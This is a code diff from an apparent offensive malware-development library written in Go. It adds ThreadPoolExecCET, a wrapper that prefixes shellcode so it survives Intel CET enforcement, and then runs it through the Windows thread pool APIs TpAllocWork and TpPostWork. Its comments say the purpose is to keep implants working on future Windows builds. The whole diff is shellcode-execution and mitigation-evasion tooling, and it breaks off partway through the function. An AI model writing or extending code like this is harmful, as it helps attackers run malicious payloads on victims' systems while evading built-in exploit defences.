@@ -6,14 +6,37 @@ import (
 	"fmt"
 	"unsafe"
 
+	"github.com/oioio-space/maldev/evasion/cet"
 	"github.com/oioio-space/maldev/win/api"
 	"golang.org/x/sys/windows"
 )
+
+// ThreadPoolExecCET is the CET-aware wrapper around [ThreadPoolExec].
+// It calls [cet.Wrap] on the shellcode when [cet.Enforced]() returns
+// true, then forwards to ThreadPoolExec.
+//
+// Current shipping Windows builds do NOT enforce CET on the thread
+// pool dispatcher — meaning ThreadPoolExec works fine without
+// wrapping today. The wrapper future-proofs callers: if a future
+// build flips the dispatcher to ENDBR64-required (the same model
+// KiUserApcDispatcher uses), implants built against this helper
+// keep working without a code change. The cost of a no-op
+// wrap on non-enforced hosts is 4 bytes of shellcode prefix.
+func ThreadPoolExecCET(shellcode []byte) error {
+	if cet.Enforced() {
+		shellcode = cet.Wrap(shellcode)
+	}
+	return ThreadPoolExec(shellcode)
+}
 
 // ThreadPoolExec executes shellcode via the current process's thread pool.
 // Uses TpAllocWork + TpPostWork + TpReleaseWork from ntdll to schedule
 // shellcode as a worker callback on an existing thread pool thread,
 // avoiding creation of a new thread.
+//
+// CET note: the thread pool dispatcher does not enforce ENDBR64 on
+// the callback in current shipping Windows builds, so plain shellcode
+// fires correctly. Use [ThreadPoolExecCET] for future-proofed code.
 func ThreadPoolExec(shellcode []byte) error {
 	if err := validateShellcode(shellcode); err != nil {
 		return err
